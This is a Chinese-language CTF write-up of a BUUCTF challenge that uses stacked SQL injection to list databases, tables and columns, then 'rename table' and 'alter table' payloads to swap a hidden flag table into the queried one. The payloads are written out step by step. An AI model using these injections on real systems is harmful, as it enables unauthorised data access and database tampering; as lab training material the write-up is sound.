### rename()+alter() 改表绕过

话不多说，直接上题（BUUCTF）

![](https://pic1.imgdb.cn/item/682afb5c58cb8da5c8fc3326.jpg)

测试是 Get 型数字注入

![](https://pic1.imgdb.cn/item/682afb7e58cb8da5c8fc340a.jpg)

fuzz 发现没有过滤 `;`，使用堆叠注入爆库爆表

```sql
1'; show databases;
```

![](https://pic1.imgdb.cn/item/682afc1758cb8da5c8fc38f7.jpg)

爆表发现有两个

```sql
1'; show tables;
```

![](https://pic1.imgdb.cn/item/682b00ef58cb8da5c8fc48c7.jpg)

查数字表需要用反引号 `` 包裹起来，在里面发现 flag

```
1'; show columns from `1919810931114514`; #
```

![](https://pic1.imgdb.cn/item/682b011d58cb8da5c8fc48d3.jpg)

在 `words` 表中发现两个字段

```sql
1'; show columns from words; #
```

![](https://pic1.imgdb.cn/item/682b015c58cb8da5c8fc48f2.jpg)

正常应用执行的查询类似

```sql
SELECT * FROM words WHERE id = '[用户输入]';		# 返回结果会以表格形式显示 words 表中 id 匹配的记录
```

在 fuzz 中发现没有禁用 `rename` 和 `alter`，那么就可以改表替换拿到我们想要的 flag

首先将 `words` 改为别的表名

```sql
rename table words to suc2es2;
```

同时将数字表改为 `words`

```sql
rename table `1919810931114514` to words;
```

因为查询的是 `id` 字段，数字表没有，所以要添加一个

```sql
alter table words add id int unsigned not NULL auto_increment primary key;
```

将 `flag` 字段改为 `data`

```sql
alter table words change flag data varchar(100);#
```

执行上述 payload 后，只需输入 1，就会执行

```sql
SELECT * FROM words WHERE id = '1';
```

![](https://pic1.imgdb.cn/item/682b0a2558cb8da5c8fc5047.jpg)

